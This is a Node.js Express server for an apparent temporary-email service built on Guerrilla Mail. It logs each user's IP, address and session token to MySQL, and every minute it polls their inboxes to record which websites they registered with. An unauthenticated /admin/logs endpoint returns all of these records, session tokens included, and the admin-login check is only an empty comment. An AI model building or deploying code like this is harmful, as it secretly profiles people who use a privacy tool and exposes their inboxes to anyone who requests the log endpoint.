const express = require("express");
const mysql = require("mysql2");
const cors = require("cors");
const app = express();
require('dotenv').config();


//middleware
app.set("trust proxy", true);
app.use(cors());
app.use(express.json()); // To parse JSON body requests

// MySQL Connection
const db = mysql.createConnection({
  host: process.env.DB_HOST,
  port: process.env.DB_PORT || 3306,
  user: process.env.DB_USER,
  password: process.env.DB_PASS,
  database: process.env.DB_NAME
});

db.connect(err => {
    if (err) {
        console.error("MySQL connection failed:", err);
        return;
    }
    console.log("Connected to MySQL");
});

const activeEmails = {}; //store active sessions

// Middleware to check admin login

// ************ API endpoints ***************

// Endpoint to generate a temporary email and log the user's IP
app.post("/generate-email", (req, res) => {
    const userIP = req.headers["x-forwarded-for"] || req.ip || req.socket.remoteAddress;
    const { email, sid_token } = req.body;

    console.log("Email from frontend:", email);
    console.log("Detected IP:", userIP);
    console.log("Session id: ", sid_token)
    console.log("Received from frontend:", req.body);

    if (!email || !sid_token) {
        return res.status(400).json({ error: "Email and sid_token are required" });
    }

    activeEmails[email] = sid_token; // for auto inbox checking

    // Insert email and IP into MySQL
    db.query("INSERT INTO logs (ip, email, sid_token) VALUES (?, ?, ?)", [userIP, email, sid_token], err => {
        if (err) console.error("DB insert error:", err);
    });

    res.json({ success: true, email });
});

// Endpoint to fetch logged website visits for the admin panel
app.get("/admin/logs", (req, res) => {
    db.query("SELECT * FROM logs ORDER BY timestamp DESC", (err, results) => {
        if (err) {
            console.error("Database error:", err);
            return res.status(500).json({ error: "Database error" });
        }
        res.json(results);
    });
});

// Automatic inbox checker
setInterval(async () => {
    for (const [email, sidToken] of Object.entries(activeEmails)) {
        try {
            const inboxRes = await fetch(`https://www.guerrillamail.com/ajax.php?f=get_email_list&offset=0&sid_token=${sidToken}`);
            const inboxData = await inboxRes.json();
            const emails = inboxData.list || [];
            console.log("Sid: ", sidToken);

            for (const mail of emails) {
                const mailInfoRes = await fetch(`https://www.guerrillamail.com/ajax.php?f=fetch_email&email_id=${mail.mail_id}&sid_token=${sidToken}`);
                const mailInfo = await mailInfoRes.json();
                const senderDomain = mailInfo.mail_from.split("@")[1];

                db.query("UPDATE logs SET website_visited = ? WHERE email = ?", [senderDomain, email], err => {
                    if (err) console.error("Log sender domain error:", err);
                });
            }
        } catch (err) {
            console.error("Inbox check failed for:", email, err.message);
        }
    }
}, 60 * 1000); // every 1 minute


app.listen(3000, () => console.log("Server running on port 3000")); //server start


//node server.js
//http://127.0.0.1:3000/admin
//http://localhost:3000/admin/logs
